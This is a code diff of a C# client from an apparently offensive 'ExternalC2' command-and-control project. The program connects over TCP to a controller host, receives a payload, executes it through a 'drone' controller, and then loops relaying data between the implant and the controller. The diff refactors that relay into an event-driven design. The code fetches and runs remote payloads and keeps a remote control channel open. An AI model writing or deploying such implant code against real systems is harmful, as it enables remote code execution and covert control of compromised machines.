@@ -1,7 +1,6 @@
 ﻿using System;
 using System.Net;
 using System.Net.Sockets;
-using System.Text;
 using System.Threading.Tasks;
 
 using ExternalC2.Net.Client;
@@ -22,43 +21,37 @@ internal static class Program
         var port = int.Parse(args[1]);
 
         // connect to controller
-        var client = new TcpClient();
-        await client.ConnectAsync(target, port);
-        
-        // generate and send a pipename
-        var pipename = Guid.NewGuid().ToString();
-        await client.WriteData(Encoding.Default.GetBytes(pipename));
+        var controller = new TcpClient();
+        await controller.ConnectAsync(target, port);
         
         // read payload
-        var payload = await client.ReadData();
-        
-        // create new client controller
-        var controller = new ClientController(pipename);
-        
-        if (!await controller.ExecutePayload(payload))
+        var payload = await controller.ReadData();
+
+        // create drone controller
+        var drone = new DroneController();
+
+        // event is fired whenever the drone sends outbound data
+        drone.OnDataFromDrone += async delegate(byte[] bytes)
         {
-            Console.WriteLine("Failed to connect to pipe");
-            return;
-        }
+            // send to controller
+            await controller.WriteData(bytes);
+        };
         
-        // drop into a loop
+        drone.ExecutePayload(payload);
+
+        // drop into loop
         while (controller.Connected)
         {
-            // read from drone
-            var outbound = await controller.ReadDrone();
-
-            // send to controller
-            await client.WriteData(outbound);
-
-            // read from controller
-            var inbound = await client.ReadData();
-
-            // send to drone
-            await controller.SendDrone(inbound);
+            if (controller.DataAvailable())
+            {
+                // read from controller
+                var downstream = await controller.ReadData();
+                
+                // send it to the drone
+                drone.SendDrone(downstream);
+            }
 
             await Task.Delay(100);
         }
-
-        controller.Dispose();
     }
 }
